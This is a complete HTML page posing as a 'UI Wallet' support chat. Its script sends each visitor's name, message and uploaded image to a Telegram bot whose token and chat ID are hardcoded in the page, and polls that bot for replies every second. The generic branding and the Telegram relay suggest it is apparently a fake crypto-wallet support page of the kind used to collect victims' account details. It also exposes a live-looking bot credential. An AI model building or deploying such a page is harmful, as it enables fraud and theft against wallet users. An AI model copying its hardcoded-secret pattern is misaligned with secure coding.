<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Support Chat - UI Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: #f8fafc;
      color: #1e293b;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      overflow-y: auto;
      background-image: url('https://images.unsplash.com/photo-1667315381632-8c54f93b2b8e?auto=format&fit=crop&w=1350&q=80');
      background-size: cover;
      background-position: center;
      position: relative;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(8px);
      z-index: 0;
    }

    header {
      position: absolute;
      top: 20px;
      left: 20px;
      right: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 2;
    }

    .back-btn {
      background: rgba(0, 0, 0, 0.06);
      border: none;
      padding: 10px 14px;
      border-radius: 12px;
      color: #1e293b;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 0 8px rgba(0, 0, 0, 0.15);
    }

    .logo {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
    }

    .logo img {
      height: 75px;
      width: 75px;
      border-radius: 50%;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.15);
    }

    .chat-box {
      position: relative;
      z-index: 1;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 24px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 8px 24px rgba(59, 130, 246, 0.15), 0 0 40px rgba(59, 130, 246, 0.1);
      padding: 32px 28px 40px;
      display: flex;
      flex-direction: column;
      animation: fadeZoom 0.6s ease forwards;
      user-select: none;
    }

    @keyframes fadeZoom {
      0% { opacity: 0; transform: scale(0.94); }
      100% { opacity: 1; transform: scale(1); }
    }

    .chat-box h2 {
      margin: 0 0 12px;
      font-weight: 700;
      font-size: 28px;
      text-align: center;
      color: #3b82f6;
      text-shadow: 0 0 8px #93c5fd, 0 0 15px #60a5fa;
      user-select: text;
    }

    .instruction {
      text-align: center;
      color: #475569;
      font-size: 14px;
      margin-bottom: 28px;
      user-select: none;
      font-weight: 500;
      line-height: 1.4;
    }

    input[type="text"],
    textarea {
      background: #f1f5f9;
      border: 1px solid #e2e8f0;
      border-radius: 14px;
      padding: 14px 18px;
      font-size: 16px;
      color: #1e293b;
      margin-bottom: 18px;
      resize: none;
      box-shadow: inset 0 0 4px rgba(59, 130, 246, 0.15);
      transition: box-shadow 0.3s ease, background-color 0.3s ease;
      font-weight: 500;
    }

    input[type="text"]::placeholder,
    textarea::placeholder {
      color: #94a3b8;
      font-weight: 400;
    }

    input[type="text"]:focus,
    textarea:focus {
      outline: none;
      background: #ffffff;
      box-shadow: 0 0 10px 2px #93c5fd;
      color: #1e293b;
    }

    .file-input-wrapper {
      position: relative;
      margin-bottom: 24px;
    }

    input[type="file"] {
      width: 100%;
      padding: 10px;
      border-radius: 14px;
      background: #f1f5f9;
      color: #334155;
      font-size: 14px;
      cursor: pointer;
      box-shadow: inset 0 0 5px rgba(59, 130, 246, 0.1);
      transition: box-shadow 0.3s ease;
    }

    input[type="file"]:hover {
      box-shadow: 0 0 10px 2px #3b82f6;
    }

    input[type="file"]:focus {
      outline: none;
      background: #ffffff;
      box-shadow: 0 0 10px 2px #3b82f6;
      color: #1e293b;
    }

    button {
      background: linear-gradient(135deg, #3b82f6, #6366f1);
      border: none;
      border-radius: 14px;
      padding: 16px 0;
      font-size: 18px;
      font-weight: 700;
      color: white;
      cursor: pointer;
      box-shadow: 0 0 20px rgba(99, 102, 241, 0.4);
      transition: box-shadow 0.3s ease, transform 0.2s ease;
      user-select: none;
    }

    button:hover, button:focus {
      box-shadow: 0 0 24px 4px #60a5fa, 0 0 30px 10px rgba(99, 102, 241, 0.3);
      transform: scale(1.05);
      outline: none;
    }

    #status {
      margin-top: 16px;
      font-size: 15px;
      text-align: center;
      color: #3b82f6;
      min-height: 20px;
      user-select: none;
      font-weight: 600;
      text-shadow: 0 0 4px rgba(99, 102, 241, 0.3);
    }

    #chatDisplay {
      margin-top: 24px;
      max-height: 300px;
      overflow-y: auto;
      border: 1px solid #cbd5e1;
      border-radius: 14px;
      padding: 12px;
      background: #e0e7ff;
      user-select: text;
    }

    #chatDisplay strong {
      display: block;
      margin-bottom: 8px;
      color: #1e293b;
    }

    #messages div {
      padding: 8px 12px;
      margin-bottom: 8px;
      background-color: #dbeafe;
      border-radius: 12px;
      color: #1e293b;
      white-space: pre-wrap;
    }

    @media (max-width: 520px) {
      .chat-box {
        padding: 28px 20px 36px;
        border-radius: 18px;
      }
      .chat-box h2 {
        font-size: 24px;
      }
      .instruction {
        font-size: 13px;
        margin-bottom: 24px;
      }
      input[type="text"],
      textarea {
        font-size: 14px;
      }
      button {
        font-size: 16px;
        padding: 14px 0;
      }
    }

    #loader {
      background: #f8fafc;
      height: 100vh;
      width: 100vw;
      position: fixed;
      top: 0;
      left: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      opacity: 1;
      transition: opacity 0.5s ease;
    }

    .loader-container {
      position: relative;
      width: 240px;
      height: 240px;
    }

    .loader-logo {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 72px;
      font-weight: bold;
      color: #3b82f6;
      user-select: none;
      white-space: nowrap;
      z-index: 2;
      animation: scalePulse 2s infinite ease-in-out;
    }

    .spinner-ring {
      position: absolute;
      top: 0;
      left: 0;
      width: 240px;
      height: 240px;
      border: 5px solid transparent;
      border-left: 5px solid #3b82f6;
      border-bottom: 5px solid rgba(59, 130, 246, 0.6);
      border-right: 5px solid rgba(59, 130, 246, 0.3);
      border-top: 5px solid transparent;
      border-radius: 50%;
      animation: spin 2s linear infinite;
      z-index: 1;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes scalePulse {
      0%, 100% { transform: translate(-50%, -50%) scale(1); }
      50% { transform: translate(-50%, -50%) scale(1.2); }
    }
  </style>
</head>
<body>
  <div id="loader">
    <div class="loader-container">
      <div class="loader-logo">FMS</div>
      <div class="spinner-ring"></div>
    </div>
  </div>

  <div class="overlay"></div>

  <header>
    <button onclick="history.back()" class="back-btn">‚Üê Back</button>
    <div class="logo">
      <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" alt="Logo" />
    </div>
  </header>

  <main class="chat-box">
    <h2>Contact Support</h2>
    <p class="instruction">
      Submit your issue here and it will be resolved in a minute. Our support team is ready to assist you quickly and efficiently.
    </p>
    <input type="text" id="name" placeholder="Your name" required />
    <textarea id="message" placeholder="Type your message here..." rows="5" required></textarea>
    <div class="file-input-wrapper">
      <input type="file" id="image" accept="image/*" />
    </div>
    <button type="button" onclick="sendMessage()" id="sendBtn">Send Message</button>
    <button class="refresh-btn" onclick="pollReplies()" style="margin-top: 10px;">üîÑ Refresh</button>
    <p id="status"></p>

    <div id="chatDisplay">
      <strong>Support Replies:</strong>
      <div id="messages"></div>
    </div>
  </main>

<script>
  window.addEventListener("load", () => {
    setTimeout(() => {
      document.getElementById("loader").style.opacity = "0";
      setTimeout(() => {
        document.getElementById("loader").style.display = "none";
      }, 500);
    }, 1500);
  });

  const BOT_TOKEN = '7930664412:AAHPRxEXd2s6NLmKiryGvp98W3Yzb_V344o';
  const CHAT_ID = '7710943481';
  const statusElem = document.getElementById('status');
  const sendBtn = document.getElementById('sendBtn');
  let currentUser = '';
  let lastUpdateId = 0;

  function saveMessage(name, sender, text) {
    const key = `chat_${name}`;
    const existing = JSON.parse(localStorage.getItem(key)) || [];
    existing.push({ sender, text, timestamp: Date.now() });
    localStorage.setItem(key, JSON.stringify(existing));
  }

  function loadChatHistory(name) {
    const key = `chat_${name}`;
    const chat = JSON.parse(localStorage.getItem(key)) || [];
    const messagesDiv = document.getElementById('messages');
    messagesDiv.innerHTML = '';
    chat.forEach(msg => {
      const msgDiv = document.createElement('div');
      msgDiv.textContent = (msg.sender === 'user' ? 'You: ' : 'Support: ') + msg.text;
      messagesDiv.appendChild(msgDiv);
    });
  }

  document.getElementById('name').addEventListener('change', function () {
    const name = this.value.trim();
    if (name) {
      currentUser = name;
      loadChatHistory(name);
    }
  });

  async function sendMessage() {
    const name = document.getElementById('name').value.trim();
    const message = document.getElementById('message').value.trim();
    const image = document.getElementById('image').files[0];

    if (!name || !message) {
      statusElem.textContent = 'Please enter your name and message.';
      statusElem.style.color = '#f87171';
      return;
    }

    sendBtn.disabled = true;
    statusElem.style.color = '#a5b4fc';
    statusElem.textContent = 'Sending your message...';

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `üì© *New Support Request*\n\n*From:* ${name}\n*Message:* ${message}\n@${name}`,
          parse_mode: 'Markdown'
        }),
      });

      if (image) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', image);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }

      saveMessage(name, 'user', message);
      loadChatHistory(name);

      statusElem.style.color = '#22c55e';
      statusElem.textContent = 'Message sent! Support will reply soon.';
      document.getElementById('message').value = '';
      document.getElementById('image').value = '';
    } catch (error) {
      statusElem.style.color = '#f87171';
      statusElem.textContent = 'Error sending message. Try again.';
    } finally {
      sendBtn.disabled = false;
    }
  }

  // ACTUAL POLLING FUNCTION
  async function fetchNewReplies() {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
      const data = await res.json();
      if (data.result) {
        data.result.forEach(update => {
          lastUpdateId = update.update_id;
          const msg = update.message;
          if (msg && msg.text && currentUser && msg.text.includes(`@${currentUser}`)) {
            const existing = JSON.parse(localStorage.getItem(`chat_${currentUser}`)) || [];
            const alreadyExists = existing.some(m => m.text === msg.text && m.sender === 'support');
            if (!alreadyExists) {
              saveMessage(currentUser, 'support', msg.text);
              loadChatHistory(currentUser);
            }
          }
        });
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }

  // Auto polling every second
  setInterval(fetchNewReplies, 1000);

  // Manual refresh button
  document.querySelector('.refresh-btn').addEventListener('click', fetchNewReplies);
</script>
</body>
</html>
